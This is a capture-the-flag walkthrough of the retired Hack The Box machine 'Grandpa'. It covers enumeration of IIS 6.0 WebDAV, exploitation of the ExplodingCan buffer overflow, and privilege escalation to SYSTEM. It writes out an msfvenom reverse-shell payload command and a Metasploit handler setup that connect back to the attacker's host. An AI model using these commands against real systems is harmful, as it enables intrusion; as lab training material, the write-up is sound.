---
layout: post
title: "HTB-Grandpa"
categories: HTB-Walkthrough
---

![grandpa1](/assets/img/grandpa/grandpa1.png)


Grandpa is another OSCP-like box from the HTB 'retired' archive.

It's the Buffer Overflow one!

nmap first as always.

<h3>Nmap</h3>

```
nmap -sV -Pn -p- 10.10.10.14 |tee -a gp.txt
```

The results are limited.

```

Nmap scan report for 10.10.10.14
Host is up (0.18s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Scan again, with default nse scripts `-sC`

`nmap -sVC 10.10.10.14`

```

Nmap scan report for 10.10.10.14
Host is up (0.13s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Wed, 11 Mar 2020 09:56:45 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

<h4>IIS 6.0 running WebDAV</h4>


Scan again, this time checking for vulnerabilities with the `vuln` scripts

`nmap -sV --script=vuln 10.10.10.14`

```
Segmentation fault
```

We can crash the server!!!
It could be vulnerable to a `Buffer Overflow`.
 
Before we persue this, lets check out the directories.


<hr width="250" size="6">



<h3>Gobuster</h3>


```
gobuster dir -u http://10.10.10.14 -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40
```

That was a fast scan.

```

/Images (Status: 301)
/_private (Status: 403)
/_vti_cnf (Status: 403)
/_vti_log (Status: 403)
/_vti_pvt (Status: 403)
/_vti_txt (Status: 403)
/_vti_bin (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/aspnet_client (Status: 403)
/images (Status: 301)

```


`http://10.10.10.14/_vti_bin/shtml.dll`

```
Cannot run the FrontPage Server Extensions on this page: ""
```


`/_vti_bin/_vti_adm/admin.dll`

![admindll](/assets/img/grandpa/gp-admindll.png)



`/_vti_bin/_vti_aut/author.dll`

![authordll](/assets/img/grandpa/gp-authordll.png)


`http://10.10.10.14/images/`

![denied](/assets/img/grandpa/gp-denied.png)


<hr width="250" size="6">


<h3>Searchsploit</h3>


`searchsploit iis 6` returns a long list.


`searchsploit iis 6.0 |grep WebDAV |grep -v '/dos/'` is better.

![searchsploit](/assets/img/grandpa/gp-searchsploit.png)


<hr width="250" size="6">

We can read the exploit with

`searchsploit -x 41738`

Unfamiliar with this exploit, and not wanting to simply swap out the shellcode and fire it off,
I used google to do a bit more research.

[This review](https://www.secarma.com/labs/explodingcan-a-vulnerability-review.html) looks at the vulnerability, and gives
context for the exploit.

It is well worth a read!


<hr width="250" size="6">


Searching again on Google for more info, using the exploit's name `ExplodingCan`, I found [another script](https://github.com/danigargu/explodingcan).

So we now have two versions of essentially the same exploit. We can look at them both!



`searchsploit -m 41738` will copy the first exploit to the pwd (present working directory) and have a closer look.


```

 searchsploit -m 41738
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/41738
     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
File Type: troff or preprocessor input, ASCII text, with very long lines, with CRLF line terminators

Copied to: /root/HTB/vip/grandpa/41738.py

```

<hr width="250" size="6">



The Second exploit looks more simple to impliment than the first, I copy it from github as
 explodingcan.py, and generate a `shellcode` file with msfvenom.


<hr width="250" size="6">




<h4>MsfVenom, Meterpreter + Multi/Handler</h4>

```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.10 LPORT=443 | tee shellcode
```


Fire up metasploit

```
service postgresql start
msfconsole
```

Because we used a staged meterpreter payload, we'll need to use the 
exploit/multi/handler.


```

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.10.14.10
lhost => 10.10.14.10
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.10:443 

```


<hr width="250" size="6">


With everything ready, we execute the exploit with the following command:

`python explodingcan.py http://10.10.10.14 shellcode`


![excan-exploit](/assets/img/grandpa/gp-excan-exploit.png)

![meterpreter](/assets/img/grandpa/gp-meterpreter1.png)


<hr width="250" size="6">


<h3>Privilege Escalation</h3>

So we've got a meterpreter shell. The second [exploit](https://github.com/danigargu/explodingcan/blob/master/explodingcan.py)
 was straight-forward to impliment. 

We need to background the session and look for a path to privilege-escalation.

`use post/multi/recon/local_exploit_suggester`

![post1](/assets/img/grandpa/gp-post1.png)


Select `exploit/windows/local/ppr_flatten_rec`
use `show options` to set the variables.

Get SYSTEM shell.

![system](/assets/img/grandpa/gp-system.png)


Now it's a simple task to get the flags:

```
meterpreter > cat user.txt
bdxxxxxxxxxxxxxxxxxxxxxxxxxxxx69

meterpreter > cat root.txt
93xxxxxxxxxxxxxxxxxxxxxxxxxxxx7b

```


:)


